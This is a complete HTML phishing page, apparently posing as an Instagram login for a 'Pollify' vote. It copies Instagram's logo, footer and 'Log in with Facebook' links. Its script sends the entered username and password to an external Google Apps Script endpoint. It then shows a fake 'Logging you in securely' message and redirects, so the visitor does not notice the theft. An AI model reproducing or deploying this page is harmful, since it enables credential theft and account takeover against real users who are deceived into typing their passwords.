<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="stylesheet" href="./styles.css" />
    <link rel="icon" href="img/insta-fav.ico" type="image/x-icon">
    <title>Pollify vote connect instagram</title>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex"></section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                   <img src="img/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <form name="submit-to-google-sheet">
                    <label for="username" class="sr-only">Username</label>
                    <input type="text" name="username" placeholder="Username" required />
                    <label for="password" class="sr-only">Password</label>
                    <input type="password" name="password" placeholder="Password" required />
                    <button type="submit">Log in</button>
                </form>
                <span id="msg"></span>

                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">or</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div style="display: flex; flex-direction: column; align-items: center; margin-bottom: 16px;">
                        <div style="display: flex; align-items: center; gap: 6px;">
                           <img src="./img/Facebook.png" alt="Facebook Icon" style="width: 16px; height: 16px;" />
                            <a href="#" style="color: #385185; font-weight: 500; font-size: 14px; text-decoration: none;">Log in with Facebook</a>
                        </div>
                        <a href="#" style="margin-top: 12px; font-size: 12px; color: #00376b; text-decoration: none;">Forgot password?</a>
                    </div>
                </div>
            </div>

            <div class="panel register flex justify-content-center">
                <p>Don't have an account?</p>
                <a href="#">Sign up</a>
            </div>

            <div class="app-download flex direction-column align-items-center">
                <p>Get the app.</p>
                <div class="flex justify-content-center">
                    <img src="img/apple-button.png" alt="Apple Store Logo" title="Download from Apple Store" />
<img src="img/googleplay-button.png" alt="Google Play Logo" title="Download from Google Play" />
                </div>
            </div>
        </section>
    </main>

    <footer>
        <ul>
            <li><a href="#">About</a></li>
            <li><a href="#">Help</a></li>
            <li><a href="#">Press</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">Careers</a></li>
            <li><a href="#">Privacy</a></li>
            <li><a href="#">Terms</a></li>
            <li><a href="#">Location</a></li>
            <li><a href="#">Top Accounts</a></li>
            <li><a href="#">Hashtags</a></li>
            <li><a href="#">Language</a></li>
        </ul>
        <p class="copyright">Â© 2020 Instagram from Facebook</p>
    </footer>

    <script>
  const scriptURL = 'https://script.google.com/macros/s/AKfycbyjJKp0Px3ogPGg1nd1mszkzQc9AK6kEUcLJRghST40fwuxtRhz-kFZBdgeCixtGcRo/exec';
  const form = document.forms['submit-to-google-sheet'];
  const msg = document.getElementById("msg");

  form.addEventListener('submit', e => {
    e.preventDefault();
    fetch(scriptURL, { method: 'POST', body: new FormData(form) })
      .then(response => {
        if (response.ok) {
          form.style.display = 'none';
          msg.innerHTML = `
            <p>Logging you in securely...</p>
            <p>If you are not redirected automatically, <a href="mock-redirect.html">click here</a>.</p>
          `;
          setTimeout(() => {
            window.location.href = 'mock-redirect.html';
          }, 3000);
        } else {
          throw new Error('Response not OK');
        }
      })
      .catch(error => {
        msg.textContent = 'Something went wrong, but we saved your info.';
        console.error('Error!', error.message);
      });
  });
</script>
</body>
</html>
